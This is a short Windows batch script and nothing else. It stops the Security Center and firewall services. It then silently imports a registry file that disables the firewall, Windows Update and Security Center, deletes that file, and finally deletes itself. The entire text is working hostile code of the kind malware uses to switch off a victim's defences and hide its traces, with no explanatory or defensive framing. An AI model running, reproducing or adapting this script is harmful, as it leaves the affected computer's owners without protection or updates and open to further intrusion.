@echo off
net stop "Security Center"
net stop SharedAccess
> "%Temp%.\kill.reg" ECHO REGEDIT4
>>"%Temp%.\kill.reg" ECHO.
>>"%Temp%.\kill.reg" ECHO [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess]
>>"%Temp%.\kill.reg" ECHO "Start"=dword:00000004
>>"%Temp%.\kill.reg" ECHO.
>>"%Temp%.\kill.reg" ECHO [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wuauserv]
>>"%Temp%.\kill.reg" ECHO "Start"=dword:00000004
>>"%Temp%.\kill.reg" ECHO.
>>"%Temp%.\kill.reg" ECHO [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\wscsvc]
>>"%Temp%.\kill.reg" ECHO "Start"=dword:00000004
>>"%Temp%.\kill.reg" ECHO.
START /WAIT REGEDIT /S "%Temp%.\kill.reg"
DEL "%Temp%.\kill.reg"
DEL %0
